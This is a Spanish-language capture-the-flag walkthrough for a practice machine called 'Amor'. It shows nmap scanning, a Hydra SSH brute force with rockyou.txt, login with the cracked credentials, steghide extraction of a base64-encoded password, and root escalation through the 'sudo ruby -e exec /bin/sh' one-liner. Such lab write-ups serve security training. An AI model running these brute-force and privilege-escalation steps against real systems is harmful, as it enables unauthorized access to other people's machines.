## Nombre: Amor

1.ESCANEO

Lo primero, hacemos un ping a la maquina para comprobar la conexión:

`` ping -c 1 172.17.0.2``

- Después hacemos un escaneo simple con NMAP:

`` nmap -p- --open 172.17.0.2``

Al ver los puertos que estan abiertos, debemos hacer un escaneo únicamente a los puertos encontrados de una manera mas detallada:

`` nmap -p22,80 -sCV 172.17.0.2 ´´
    
MIRAMOS QUE CORRE POR EL SERVICIO HTTP EN EL NAVEGADOR

( http://17.17.0.2 )

 PARA VER EL CODIGO FUENTE DE LA PAGINA ( CTRL + U )

- Si nos fijamos en el contenido de la pagina, en texto plano podemos ver el nombre de uno de los usuarios que hay en el sistema.

  <img width="714" height="191" alt="image" src="https://github.com/user-attachments/assets/5d9a62eb-022d-4ad7-a8e8-ed91f82bf1ea" />



Por lo tanto podemos intentar conseguir las credenciales con un ataque por fuerza                    bruta ( HYDRA ):
puede tardar unos minutos :

``hydra  ssh://172.17.0.2 -l Carlota -P /usr/share/wordlists/rockyou.txt -s 22 ``

#### 2.ACCESO

 Con suerte, hemos obtenido la contraseña de el usuario el cual identificamos mediante la info que apariencia en la web. Para ello debemos de introducir el puerto por el que nos vamos a conectar, en este caso SSH, el nombre de usuario y su direccion sobre la que esta logueado:

`` ssh carlota@172.17.0.2  password: babygirl``, lo ponemos y

Tendremos acceso

EN ESTE PUNTO PODEMOS LIMPIAR LA CONSOLE, NO PERDEREMOS EL ACCESO

Una vez tengamos acceso al sistema, tenemos que escalar privilegios, para ello, debemos de identificar que usuarios tenemos disponibles en el servidor:

`` cat /etc/passwd`` Y veremos si hay algún otro usuario: llamado oscar

Hacemos una enumeración del sistema con `` sudo -l`` y ponemos pswd

```bash

script /dev/null -c bash : creamos una pseudo-terminal nueva

se utiliza para **iniciar una nueva sesión de bash** a través del comando `script`, redirigiendo la salida a `/dev/null`, es decir, **sin guardar nada**.

### descripcion del comando

- `script`: es un comando que normalmente graba toda la actividad de una terminal en un archivo (por defecto `typescript`).
    
- `/dev/null`: es un dispositivo especial que **descarta todo lo que se le envía**. Aquí se usa como archivo de salida para `script`, por lo tanto, no se guarda ningún registro.
    
- `-c bash`: le dice a `script` que ejecute el comando `bash`.

`script` crea una pseudo-terminal nueva, lo que a veces **restaura el comportamiento estándar de la terminal** si esta se ha corrompido.


en la maquina victima levantamos un **servidor web HTTP simple** usando Python 3 en el **puerto 443**. con : python3 -m http.server 443:

y en nuestra maquina: curl http://172.17.0.2:443/imagen.jpg --output imagen.jpg para extraer el archivo

```



- usamos exiftool para extraer los **metadatos ocultos** de imágenes
- luego usamos strings : para Ver texto oculto o incrustado en archivos
- y por ultimo usamos steghide : Recuperar esos archivos ocultos : steghide extract -sf  imagen.jpg

y observamos que hay un archivo llamado : secret.txt" con un codigo codificado en base64 
lo decodificamos 

```bash
echo ZXNsYWNhc2FkZXBpbnlwb24= | base64 -d : y nos da eslacascadepinypo

```

- ingremos al ssh con el usario oscar que se ve anteriormente: oscar@ip password
- usamos sudo -l para ver que comandos puede ejecutar este usuario. hay un binario /usr/bin/ruby
- ejecutamos script /dev/null -c bash
- con la herramienta gtfbins buscamos y vemos que es vulnerable a sudo ejecutamos: sudo ruby -e 'exec "/bin/sh"' y somos root
